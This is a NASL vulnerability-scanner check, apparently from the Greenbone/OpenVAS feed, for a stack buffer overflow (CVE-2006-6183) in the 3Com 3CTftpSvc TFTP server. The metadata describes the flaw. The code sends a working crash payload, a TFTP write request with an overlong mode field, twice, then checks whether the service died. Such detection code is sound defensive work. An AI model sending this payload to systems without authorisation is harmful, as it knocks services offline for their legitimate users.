if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802658" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_cve_id( "CVE-2006-6183" );
	script_bugtraq_id( 21301, 21322 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2012-07-10 15:15:15 +0530 (Tue, 10 Jul 2012)" );
	script_name( "3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/23113" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/30545" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2006120002" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to cause the
  application to crash, denying further service to legitimate users." );
	script_tag( name: "affected", value: "3Com 3CTFTPSvc TFTP Server version 2.0.1." );
	script_tag( name: "insight", value: "The flaw is due to a boundary error during the processing of
  TFTP Read/Write request packet types. This can be exploited to cause a stack
  based buffer overflow by sending a specially crafted packet with an overly long mode field." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running 3CTftpSvc TFTP Server and is prone to buffer
  overflow vulnerability." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_alive( port: port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
mode = "netascii" + crap( data: "A", length: 469 );
attack = raw_string( 0x00, 0x02 ) + "A" + raw_string( 0x00 ) + mode + raw_string( 0x00 );
send( socket: soc, data: attack );
send( socket: soc, data: attack );
close( soc );
sleep( 2 );
if(!tftp_alive( port: port )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

